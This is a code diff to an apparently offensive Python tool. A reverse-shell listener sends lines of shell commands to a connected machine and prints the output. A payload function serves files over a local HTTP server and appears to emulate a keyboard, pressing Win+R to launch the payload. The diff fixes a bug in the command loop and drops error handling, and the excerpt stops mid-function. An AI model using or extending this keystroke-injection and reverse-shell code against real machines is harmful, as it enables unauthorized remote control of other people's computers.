@@ -26,7 +26,7 @@ def reverse_shell_listener():
 		data = conn.recv(1024).decode("UTF-8") # Inital Connect
 		codelines=shellcode.split("\n")
 		for line in codelines:
-			conn.send(bytes(codelines + "\n\r", "UTF-8")) # Send shell command.
+			conn.send(bytes(line + "\n\r", "UTF-8")) # Send shell command.
 			data = conn.recv(1024).decode("UTF-8") # Receive output from command.
 			print(data) # Print the output of the command.
 	except KeyboardInterrupt: 
@@ -36,15 +36,12 @@ def reverse_shell_listener():
 
 def payload():
 	eco.change_hid()
-	try:
-		web_dir = os.path.join(os.path.dirname(__file__), 'http')
-		os.chdir(web_dir)
-		httpHandler = http.server.SimpleHTTPRequestHandler
-		httpd = socketserver.TCPServer(('',8000),httpHandler)
-		httplistener=Process(target=httpd.handle_request)
-		httplistener.start()
-	except:
-		httpd.shutdown()
+	web_dir = os.path.join(os.path.dirname(__file__), 'http')
+	os.chdir(web_dir)
+	httpHandler = http.server.SimpleHTTPRequestHandler
+	httpd = socketserver.TCPServer(('',8000),httpHandler)
+	httplistener=Process(target=httpd.handle_request)
+	httplistener.start()
 	sleep(3)
 	eco.press("LGUI+R")
 	sleep(1)
